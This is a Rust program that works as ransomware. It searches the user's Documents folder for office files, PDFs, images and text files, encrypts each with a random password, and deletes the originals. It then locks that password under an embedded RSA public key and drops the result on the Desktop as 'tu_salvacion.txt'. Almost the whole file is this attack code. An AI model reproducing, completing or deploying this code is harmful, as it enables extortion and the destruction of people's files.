pub mod build;

use std::fs::{File, remove_file};
use std::io::{BufWriter, Read, Write};

use rsa::Pkcs1v15Encrypt;
use rsa::{RsaPublicKey, pkcs1::DecodeRsaPublicKey};

use orion::hazardous::{
    aead::xchacha20poly1305::{seal, open, Nonce, SecretKey},
    mac::poly1305::POLY1305_OUTSIZE,
    stream::xchacha20::XCHACHA_NONCESIZE,
};

use orion::hazardous::stream::chacha20::CHACHA_KEYSIZE;
use orion::kdf::{derive_key, Password, Salt};
use rand::distributions::Alphanumeric;
use rand::Rng;
use rand_core::{OsRng, RngCore};
use walkdir::WalkDir;

fn get_random(dest: &mut [u8]) {
    RngCore::fill_bytes(&mut OsRng, dest);
}

fn nonce() -> Vec<u8> {
    let mut randoms: [u8; 24] = [0; 24];
    get_random(&mut randoms);
    return randoms.to_vec();
}

fn auth_tag() -> Vec<u8> {
    let mut randoms: [u8; 32] = [0; 32];
    get_random(&mut randoms);
    return randoms.to_vec();
}

fn simple_split_encrypted(cipher_text: &[u8]) -> (Vec<u8>, Vec<u8>) {
    return (
        cipher_text[..CHACHA_KEYSIZE].to_vec(),
        cipher_text[CHACHA_KEYSIZE..].to_vec(),
        )
}

fn create_key(password: String, nonce: Vec<u8>) -> SecretKey {
    let password = Password::from_slice(password.as_bytes()).unwrap();
    let salt = Salt::from_slice(nonce.as_slice()).unwrap();
    let kdf_key = derive_key(&password, &salt, 15, 1024, CHACHA_KEYSIZE as u32).unwrap();
    let key = SecretKey::from_slice(kdf_key.unprotected_as_bytes()).unwrap();
    return key;
}

fn encrypt_core(
    dist: &mut File,
    contents: Vec<u8>,
    key: &SecretKey,
    nonce: Nonce,
) {
    let ad = auth_tag();
    let output_len = match contents.len().checked_add(POLY1305_OUTSIZE + ad.len()) {
        Some(min_output_len) => min_output_len,
        None => panic!("Plaintext is too long"),
    };

    let mut output = vec![0u8; output_len];
    output[..CHACHA_KEYSIZE].copy_from_slice(ad.as_ref());
    seal(&key, &nonce, contents.as_slice(), Some(ad.clone().as_slice()), &mut output[CHACHA_KEYSIZE..]).unwrap();
    dist.write(&output.as_slice()).unwrap();
}

fn decrypt_core(
    dist: &mut File,
    contents: Vec<u8>,
    key: &SecretKey,
    nonce: Nonce
) {
    let split = simple_split_encrypted(contents.as_slice());
    let mut output = vec![0u8; split.1.len() - POLY1305_OUTSIZE];

    open(&key, &nonce, split.1.as_slice(), Some(split.0.as_slice()), &mut output).unwrap();
    dist.write(&output.as_slice()).unwrap();
}


const CHUNK_SIZE: usize = 128; // The size of the chunks you wish to split the stream into.

pub fn encrypt_large_file(
    file_path: &str,
    output_path: &str,
    password: String
) -> Result<(), orion::errors::UnknownCryptoError> {
    let mut source_file = File::open(file_path).expect("Failed to open input file");
    let mut dist = File::create(output_path).expect("Failed to create output file");

    let mut src = Vec::new();
    source_file.read_to_end(&mut src).expect("Failed to read input file");

    let nonce = nonce();

    dist.write(nonce.as_slice()).unwrap();
    let key = create_key(password, nonce.clone());
    let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();

    for (n_chunk, src_chunk) in src.chunks(CHUNK_SIZE).enumerate() {
        encrypt_core(&mut dist, src_chunk.to_vec(), &key, nonce)
    }

    Ok(())
}

pub fn decrypt_large_file(
    file_path: &str, 
    output_path: &str,
    password: String
) -> Result<(), orion::errors::UnknownCryptoError> {
    let mut input_file = File::open(file_path).expect("Failed to open input file");
    let mut output_file = File::create(output_path).expect("Failed to create output file");

    let mut src: Vec<u8> = Vec::new();
    input_file.read_to_end(&mut src).expect("Failed to read input file");

    let nonce = src[..XCHACHA_NONCESIZE].to_vec();

    src = src[XCHACHA_NONCESIZE..].to_vec();

    let key = create_key(password, nonce.clone());
    let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();

    for (n_chunk, src_chunk) in src.chunks(CHUNK_SIZE + CHACHA_KEYSIZE + POLY1305_OUTSIZE).enumerate() {
        decrypt_core(&mut output_file, src_chunk.to_vec(), &key, nonce);
    }

    Ok(())
}

fn main() {
    
    let extensions = ["docx", "xlsx", "pdf", "jpeg", "jpg", "txt"];

    let documents_dir = match dirs::document_dir() {
        Some(path) => path,
        None => {
            eprintln!("Could not find the Documents folder.");
            return;
        }
    };
    let pass = generate_random_string(20);

    let pem = "-----BEGIN PUBLIC KEY-----
MIICITANBgkqhkiG9w0BAQEFAAOCAg4AMIICCQKCAgB5OsRTqlZyDWrtA4eWiqsq
0ylZChWRQy8jY6CW4iTV6rFokdbv+dUNmSAEc1zjwh1boJ5vmbHJvE678tgjb7de
b7pvz9gZ9MkpSH+Y9GCDBYfDZ8RZeaip8iXw0uUsVRX+zszYnPvDJL6LagvH0nXC
IyNDt6e3Jbrqir9TrBTFqfIcdC/VK3KUtlmEc9ddvDOPQgssYxlmvUTq6vnHcIGJ
P44xOmq9i+kLNSfkNKqvz0mgw47vwtew7pfTBsv374RAW34fQGXY9aKPu+1hA4o8
9zt6CUz/sEwp0yasx5JXTsSgoxO5p9LaQkqChDhra1PdZKx+4ffgtlrv4wBsE77Y
IMGgJ5JZ5A+SuLFO7W4dEU0Z2efjlkc9LZOOO9ftTOTQkwqvI7k61r1ny1KnYak+
e2Sxyj85SbOxhIJ6uPtxythMF7WVhjt/6D+CqDsqhAO+b5tak28eM2AZsfWooYSm
hKl1stVsvBY9GxSt0kv/nxKTkmkR4xx6WSxGiYyPVW0nv2w1KhPo0wMyeY9SO9xO
dD+mK8dE6gzZKEmhYyDDqo4GxNq7zcuzli2DcyJRM0dlM4l790/sPwaGOAiZ+yWo
Ee0dgWcIEDLfOxn1tZiuiNQy5Z3CiRkoVlZqfBnDJG9dd2zYJRkEA1IJSUYQyGGh
PpeQB5AFqhJgbOr6L07eCwIDAQAB
-----END PUBLIC KEY-----";

    let public_key = RsaPublicKey::from_pkcs1_pem(pem).unwrap();
    let mut rng = rand::thread_rng();

    let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, pass.as_bytes()).unwrap();
    let _ = save_key_to_file(&passenc, "tu_salvacion.txt");

    for entry in WalkDir::new(documents_dir)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| {
            e.file_type().is_file() &&
            e.path().extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| extensions.contains(&ext))
                .unwrap_or(false)
        }) {
        let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), pass.to_owned());
        let _ = remove_file(entry.path());
    }
}
fn generate_random_string(length: usize) -> String {
    let s : String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .map(char::from)
        .collect();
    s
}


fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
    let desktop_dir = match dirs::desktop_dir() {
        Some(path) => path,
        None => return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "Desktop directory not found")),
    };
    let key_file_path = desktop_dir.join(file_name);
    let mut key_file = BufWriter::new(File::create(&key_file_path)?);
    key_file.write_all(key)?;
    Ok(())
}